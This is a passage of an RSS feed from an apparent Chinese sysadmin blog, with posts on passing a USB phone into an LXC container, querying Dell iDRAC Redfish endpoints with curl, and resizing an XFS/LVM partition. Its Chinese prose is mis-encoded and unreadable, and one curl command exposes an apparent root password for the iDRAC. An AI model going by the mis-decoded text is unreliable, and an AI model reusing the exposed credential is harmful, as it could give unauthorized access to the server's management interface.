      <description>&lt;p&gt;æµ‹è¯•çš„åŒäº‹è¦åœ¨æµ‹è¯•æœºä¸Šå®‰è£…&lt;code&gt;android studio&lt;/code&gt;ï¼Œadbç›´æ¥è°ƒè¯•æ‰‹æœºã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸‹éº»çƒ¦äº†ï¼Œæµ‹è¯•æœºå®é™…æ˜¯ä¸ª&lt;code&gt;lxc&lt;/code&gt;çš„å®¹å™¨ï¼Œéœ€è¦æŠŠæ’åœ¨å®¿ä¸»æœºusbä¸Šçš„æ‰‹æœºç›´æ¥è¿‡ç»™å®¹å™¨ã€‚&lt;/p&gt;
&lt;p&gt;è¯´ä¸‹åšæ³•ï¼š é¦–å…ˆåœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œlsusbï¼ŒæŸ¥å‡ºæ‰‹æœºUSBï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;root@localhost&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# lsusb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;002&lt;/span&gt; Device 002: ID 8087:0024 Intel Corp. Integrated Rate Matching Hub  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;002&lt;/span&gt; Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 014: ID 04e8:6860 Samsung Electronics Co., Ltd GT-I9100 Phone &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Galaxy S II&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, GT-I9300 Phone &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Galaxy S III&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, GT-P7500 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Galaxy Tab 10.1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; , GT-I9500 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Galaxy S 4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 004: ID 0624:0248 Avocent Corp. Virtual Hub  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bus &lt;span class=&#34;m&#34;&gt;001&lt;/span&gt; Device 005: ID 0624:0249 Avocent Corp. Virtual Keyboard/Mouse  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹æœ€é•¿çš„å¸¦&lt;code&gt;GT-I9100&lt;/code&gt;é‚£ä¸€è¡Œï¼Œ&lt;code&gt;ID 04e8:6860ï¼ŒVendorID:ProdID&lt;/code&gt;ï¼Œè¯´æ˜&lt;code&gt;Vendor=04e8 ProdID=6860&lt;/code&gt;ï¼Œè®°ä¸‹æ¥ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dellçš„idrac redfishåˆæ¢</title>
      <link>https://rendoumi.com/posts/20240124-dell_redfish/</link>
      <pubDate>Wed, 24 Jan 2024 09:04:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-dell_redfish/</guid>
      <description>&lt;p&gt;å„å¤§ä¸»æ¿å‚å•†çº·çº·æ”¯æŒä¸‹ä¸€ä»£å¸¦å¤–ç®¡ç†æ ‡å‡†redfishã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®Dellçš„idracç®¡ç†åšçš„æ˜¯ç›¸å½“å¥½çš„ï¼Œé‚£ä¹ˆæ¥çœ‹çœ‹å¯¹redfishçš„æ”¯æŒå§ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆçœ‹çœ‹v1éƒ½æœ‰ä»€ä¹ˆå‘½ä»¤&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -s  &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://10.16.24.15/redfish/v1&amp;#34;&lt;/span&gt; -k -u root:xxxxxxxx &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç»“æœå¦‚ä¸‹ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.context&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;#ServiceRoot.ServiceRoot&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.type&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;#ServiceRoot.v1_1_0.ServiceRoot&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;AccountService&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Managers/iDRAC.Embedded.1/AccountService&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Chassis&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Chassis&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Description&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Root Service&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;EventService&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/EventService&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;RootService&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;JsonSchemas&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/JSONSchemas&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Links&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Sessions&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Sessions&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Managers&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Managers&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Root Service&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Oem&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Dell&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.type&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;#DellServiceRoot.v1_0_0.ServiceRootSummary&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;IsBranded&amp;#34;&lt;/span&gt;: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ManagerMACAddress&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;50:9A:4C:82:B9:3F&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;ServiceTag&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;7Q9N8P2&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;RedfishVersion&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0.2&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Registries&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Registries&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;SessionService&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/SessionService&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Systems&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Systems&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Tasks&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/TaskService&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;UpdateService&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/UpdateService&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¥½å¤šæœåŠ¡æ’’ï¼ŒæŒ‘å…¶ä¸­ä¸€ä¸ªåˆ†æ”¯çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -s  &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://10.16.24.15/redfish/v1/Chassis&amp;#34;&lt;/span&gt; -k -u root:alibaba &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq .  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç»“æœå¦‚ä¸‹ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.context&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;#ChassisCollection.ChassisCollection&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Chassis/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.type&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;#ChassisCollection.ChassisCollection&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Description&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Collection of Chassis&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Members&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Chassis/System.Embedded.1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;@odata.id&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/redfish/v1/Chassis/Enclosure.Internal.0-1:RAID.Integrated.1-1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Members@odata.count&amp;#34;&lt;/span&gt;: 2,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Chassis Collection&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†è¯•è¯•Sessionçš„ç®¡ç†ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>LVMè°ƒæ•´åˆ†åŒºå¤§å°</title>
      <link>https://rendoumi.com/posts/20240124-lvm_resize/</link>
      <pubDate>Wed, 24 Jan 2024 09:03:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-lvm_resize/</guid>
      <description>&lt;p&gt;ç³»ç»Ÿæ˜¯xfsæ–‡ä»¶æ ¼å¼ã€‚/rootç©ºé—´ä¸å¤Ÿäº†ã€‚å¿…é¡»å¯¹ç©ºé—´è¿›è¡Œè°ƒæ•´ï¼Œæ‚²å‰§çš„æ˜¯xfsåªèƒ½å¢åŠ ç©ºé—´ï¼Œä¸èƒ½ç¼©å‡ç©ºé—´ï¼Œå¿…é¡»æ›²çº¿æ•‘å›½äº†ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ä¸€ä¸‹ï¼Œç¼ºçœæœ‰ä¸¤ä¸ªlvmçš„åˆ†åŒº&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/mapper/centos-root 40G
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/mapper/centos-home 20G
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åªèƒ½å‡å°homeåˆ†åŒºï¼Œå†å¢å¤§rootåˆ†åŒºäº†ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆå¤‡ä»½homeåˆ†åŒºï¼Œå¹¶ç¼©å°åˆ°2Gï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# yum -y install xfsdump&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# xfsdump -f /home.xfsdump /home&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;please enter label &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; this dump session &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;timeout in &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt; sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-&amp;gt; home
